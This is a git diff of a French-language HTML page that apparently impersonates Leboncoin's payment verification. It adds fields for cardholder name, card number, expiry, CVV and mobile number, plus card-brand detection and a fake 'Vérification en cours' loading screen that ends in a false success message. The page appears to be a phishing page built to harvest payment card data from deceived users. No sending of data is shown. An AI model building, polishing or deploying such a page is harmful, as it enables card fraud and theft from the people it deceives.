@@ -30,7 +30,7 @@
             margin-bottom: 150px;
         }
         h1 {
-            color: black; /* Titre en noir */
+            color: black;
             margin-bottom: 20px;
             font-size: 28px;
         }
@@ -63,7 +63,7 @@
             transition: border-color 0.3s ease, box-shadow 0.3s ease;
         }
         .input-field:focus {
-            border-color: #007BFF; /* Bleu pour correspondre au bouton */
+            border-color: #007BFF;
             box-shadow: 0 0 10px rgba(0, 123, 255, 0.2);
             outline: none;
         }
@@ -71,7 +71,7 @@
             color: #999;
         }
         .button {
-            background-color: #007BFF; /* Bouton en bleu */
+            background-color: #007BFF;
             color: white;
             padding: 18px 36px;
             text-align: center;
@@ -83,10 +83,10 @@
             border: none;
             border-radius: 10px;
             transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
-            box-shadow: 0 4px 10px rgba(0, 123, 255, 0.3); /* Ombre bleue */
+            box-shadow: 0 4px 10px rgba(0, 123, 255, 0.3);
         }
         .button:hover {
-            background-color: #0056b3; /* Bleu plus foncé au survol */
+            background-color: #0056b3;
             transform: translateY(-2px);
             box-shadow: 0 6px 15px rgba(0, 123, 255, 0.4);
         }
@@ -106,6 +106,48 @@
                 transform: translateY(-10px);
             }
         }
+        .card-details {
+            display: flex;
+            gap: 15px;
+        }
+        .card-details .input-field {
+            flex: 1;
+        }
+        .card-logos {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 10px;
+        }
+        .card-logos img {
+            height: 30px;
+            opacity: 0.3;
+            transition: opacity 0.3s ease;
+        }
+        .card-logos img.active {
+            opacity: 1;
+        }
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.9);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 24px;
+            color: #007BFF;
+            z-index: 1000;
+            display: none;
+        }
+        .confirmation-message {
+            margin-top: 20px;
+            font-size: 18px;
+            color: #28a745; /* Vert pour indiquer une réussite */
+            display: none; /* Caché par défaut */
+        }
     </style>
 </head>
 <body>
@@ -121,21 +163,92 @@
         
         <!-- Logo ajouté ici avec une animation flottante et agrandi x2 -->
         <div class="logo-container">
-            <img src="https://signastore.fr/img/cms/BRAND-PAYMENT-ICON.png" alt="Logo de vérification" style="width: 200px;"> <!-- Agrandi x2 -->
+            <img src="https://signastore.fr/img/cms/BRAND-PAYMENT-ICON.png" alt="Logo de vérification" style="width: 200px;">
         </div>
 
         <!-- Champs pour les informations personnelles -->
-        <input type="text" class="input-field" placeholder="Nom & Prénom(s)">
-        <input type="text" class="input-field" placeholder="Numéro de carte">
-        <input type="text" class="input-field" placeholder="Date d'expiration">
-        <input type="text" class="input-field" placeholder="Cryptogramme visuel">
+        <input type="text" class="input-field" placeholder="Nom et prénom du titulaire de la carte">
+        <input type="text" id="card-number" class="input-field" placeholder="Numéro de carte" maxlength="19">
+        <div class="card-logos" id="card-logos">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa" id="visa-logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" id="mastercard-logo">
+            <img src="https://logo-marque.com/wp-content/uploads/2020/11/American-Express-Logo.png" alt="American Express" id="amex-logo">
+        </div>
+        <div class="card-details">
+            <input type="text" id="expiry-date" class="input-field" placeholder="MM / YY" maxlength="7">
+            <input type="text" id="cvv" class="input-field" placeholder="CVV" maxlength="4">
+        </div>
         <input type="text" class="input-field" placeholder="Numéro de mobile">
 
         <!-- Bouton de validation en bleu -->
-        <button class="button">Valider</button>
+        <button class="button" id="validate-button">Valider</button>
+
+        <!-- Message de confirmation -->
+        <div id="confirmation-message" class="confirmation-message">
+            ✅ Vérification terminée avec succès !
+        </div>
     </div>
 
     <!-- Logo en bas, étendu sur toute la largeur -->
     <img src="https://github.com/zapata225/lebon/blob/main/Capture%20d%E2%80%99%C3%A9cran%202025-02-24%20115029.png?raw=true" alt="Logo LeBoncoin Bas" class="footer-logo">
+
+    <!-- Écran de chargement -->
+    <div class="loading-screen" id="loading-screen">
+        Vérification en cours...
+    </div>
+
+    <script>
+        // Fonction pour formater le numéro de carte
+        document.getElementById('card-number').addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            let formattedValue = value.replace(/(\d{4})/g, '$1 ').trim();
+            e.target.value = formattedValue;
+            detectCardType(value);
+        });
+
+        // Fonction pour formater la date d'expiration
+        document.getElementById('expiry-date').addEventListener('input', function (e) {
+            let value = e.target.value.replace(/[^0-9]/g, '');
+            if (value.length > 2) {
+                value = value.slice(0, 2) + ' / ' + value.slice(2, 4);
+            }
+            e.target.value = value;
+        });
+
+        // Fonction pour détecter le type de carte et afficher le logo correspondant
+        function detectCardType(cardNumber) {
+            const visaLogo = document.getElementById('visa-logo');
+            const mastercardLogo = document.getElementById('mastercard-logo');
+            const amexLogo = document.getElementById('amex-logo');
+
+            // Réinitialiser les logos
+            visaLogo.classList.remove('active');
+            mastercardLogo.classList.remove('active');
+            amexLogo.classList.remove('active');
+
+            if (/^4/.test(cardNumber)) {
+                visaLogo.classList.add('active');
+            } else if (/^5[1-5]/.test(cardNumber)) {
+                mastercardLogo.classList.add('active');
+            } else if (/^3[47]/.test(cardNumber)) {
+                amexLogo.classList.add('active');
+            }
+        }
+
+        // Écran de chargement après clic sur le bouton
+        document.getElementById('validate-button').addEventListener('click', function () {
+            const loadingScreen = document.getElementById('loading-screen');
+            const confirmationMessage = document.getElementById('confirmation-message');
+
+            // Afficher l'écran de chargement
+            loadingScreen.style.display = 'flex';
+
+            // Simuler une vérification de 3 secondes
+            setTimeout(() => {
+                loadingScreen.style.display = 'none';
+                confirmationMessage.style.display = 'block'; // Afficher le message de confirmation
+            }, 3000);
+        });
+    </script>
 </body>
 </html>
